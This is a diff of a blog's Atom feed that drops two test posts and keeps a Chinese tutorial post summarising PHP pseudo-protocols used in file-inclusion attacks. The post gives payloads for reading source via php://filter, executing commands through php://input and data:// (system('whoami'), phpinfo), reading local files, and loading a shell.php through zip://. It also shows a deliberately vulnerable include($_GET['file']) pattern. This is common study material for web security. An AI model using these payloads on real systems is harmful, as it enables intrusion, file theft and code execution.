@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2023-04-10T09:29:39.067Z</updated>
+  <updated>2023-04-10T10:09:13.371Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -17,57 +17,11 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>phpyyy</title>
-    <link href="http://example.com/2023/04/09/kk/"/>
-    <id>http://example.com/2023/04/09/kk/</id>
-    <published>2023-04-09T13:58:26.359Z</published>
-    <updated>2023-04-10T09:29:39.067Z</updated>
-    
-    <content type="html"><![CDATA[<p>php</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;php&lt;/p&gt;
-</summary>
-      
-    
-    
-    
-    <category term="php/java" scheme="http://example.com/categories/php-java/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>phptest</title>
-    <link href="http://example.com/2023/04/09/te/"/>
-    <id>http://example.com/2023/04/09/te/</id>
-    <published>2023-04-09T13:57:58.886Z</published>
-    <updated>2023-04-09T14:29:47.675Z</updated>
-    
-    <content type="html"><![CDATA[<p>hhhjj</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;hhhjj&lt;/p&gt;
-</summary>
-      
-    
-    
-    
-    <category term="php/java" scheme="http://example.com/categories/php-java/"/>
-    
-    
-  </entry>
-  
-  <entry>
     <title>php伪协议总结</title>
     <link href="http://example.com/2023/04/03/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/"/>
     <id>http://example.com/2023/04/03/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/</id>
     <published>2023-04-03T08:10:26.429Z</published>
-    <updated>2023-04-10T09:29:55.656Z</updated>
+    <updated>2023-04-10T10:09:13.371Z</updated>
     
     <content type="html"><![CDATA[<h1 id="php伪协议总结"><a href="#php伪协议总结" class="headerlink" title="php伪协议总结"></a>php伪协议总结</h1><h2 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">allow_url_fopen</span>=<span class="hljs-literal">On</span><br><span class="hljs-attr">allow_url_include</span>=<span class="hljs-literal">On</span><br></code></pre></td></tr></table></figure><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//input 是个可以访问请求的原始数据的只读流，即获取post的数据</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-comment">//echo $d;</span><br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$d</span>)<br><span class="hljs-meta">?&gt;</span><br>即所使用post中的数据<br><br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[“file”]); <span class="hljs-meta">?&gt;</span><br>可直接传入post数据，来进行<br>url=........./?file=php:<span class="hljs-comment">//input</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;whoami&quot;</span>)<span class="hljs-meta">?&gt;</span><br>因此可用来执行代码<br></code></pre></td></tr></table></figure><h2 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h2><h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs openscad">只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_<span class="hljs-meta"><span class="hljs-keyword">include</span></span><br></code></pre></td></tr></table></figure><h3 id="用法-1"><a href="#用法-1" class="headerlink" title="用法"></a>用法</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=i.php<br>或<br>?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=xx.php<br>获取目标文件的base64加密后文件内容<br>用来读取文件<br></code></pre></td></tr></table></figure><h2 id="file-x2F-x2F-伪协议"><a href="#file-x2F-x2F-伪协议" class="headerlink" title="file:&#x2F;&#x2F;伪协议"></a>file:&#x2F;&#x2F;伪协议</h2><h3 id="条件-2"><a href="#条件-2" class="headerlink" title="条件"></a>条件</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">allow_url_fopen</span>=<span class="hljs-literal">on</span>/<span class="hljs-literal">off</span>df<br><span class="hljs-attr">allow_url_include</span>=<span class="hljs-literal">on</span>/<span class="hljs-literal">off</span> （均不受影响）<br></code></pre></td></tr></table></figure><h3 id="用法-2"><a href="#用法-2" class="headerlink" title="用法"></a>用法</h3><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs delphi">?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">file</span>:<span class="hljs-comment">//C:\Windows\System32\drivers\etc\hosts</span><br>来读取本地的文件<br></code></pre></td></tr></table></figure><h2 id="phar-x2F-x2F-伪协议"><a href="#phar-x2F-x2F-伪协议" class="headerlink" title="phar:&#x2F;&#x2F;伪协议"></a>phar:&#x2F;&#x2F;伪协议</h2><h3 id="条件-3"><a href="#条件-3" class="headerlink" title="条件"></a>条件</h3><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">allow_url_fopen:</span> <span class="hljs-keyword">off</span>/<span class="hljs-keyword">on</span><br><span class="hljs-symbol">allow_url_include:</span> <span class="hljs-keyword">off</span>/<span class="hljs-keyword">on</span> (均不受影响)<br></code></pre></td></tr></table></figure><h3 id="用法-3"><a href="#用法-3" class="headerlink" title="用法"></a>用法</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=phar:<span class="hljs-regexp">//</span>压缩包名/内部文件名<br>例：phar:<span class="hljs-regexp">//</span>x.zip/x.php<br></code></pre></td></tr></table></figure><h2 id="zip-x2F-x2F-伪协议"><a href="#zip-x2F-x2F-伪协议" class="headerlink" title="zip:&#x2F;&#x2F;伪协议"></a>zip:&#x2F;&#x2F;伪协议</h2><h3 id="条件-4"><a href="#条件-4" class="headerlink" title="条件"></a>条件</h3><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">allow_url_fopen:</span> <span class="hljs-keyword">off</span>/<span class="hljs-keyword">on</span><br><span class="hljs-symbol">allow_url_include:</span> <span class="hljs-keyword">off</span>/<span class="hljs-keyword">on</span> (均不受影响<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=zip:<span class="hljs-regexp">//</span>[压缩文件绝对路径]<span class="hljs-comment">#[压缩文件内的子文件名]   </span><br>例： zip:<span class="hljs-regexp">//</span>D:\phpstudy\WWW\x.zip%<span class="hljs-number">23</span>shell.php       <span class="hljs-comment">#-&gt;%23</span><br></code></pre></td></tr></table></figure><h2 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h2><h4 id="条件-5"><a href="#条件-5" class="headerlink" title="条件"></a>条件</h4><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">allow_url_fopen:</span> <span class="hljs-keyword">on</span><br><span class="hljs-symbol">allow_url_include:</span> <span class="hljs-keyword">on</span> <br></code></pre></td></tr></table></figure><h4 id="用法-4"><a href="#用法-4" class="headerlink" title="用法"></a>用法</h4><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">和php://input很像，php://input以post提交数据那样提交数据，</span><br><span class="language-xml">data://是以get方式提交数据，也是可以执行提交的脚本</span><br><span class="language-xml"></span><br><span class="language-xml">?file=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span>%<span class="hljs-number">20</span>phpinfo()<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">对特殊字符进行了过滤，可以通过base64编码后再输入</span><br><span class="language-xml">data://text/plain;base64,base64加密的代码</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/cosmoslin/article/details/120695429">(23条消息) PHP伪协议详解_Snakin_ya的博客-CSDN博客_php伪协议</a></p>]]></content>
     
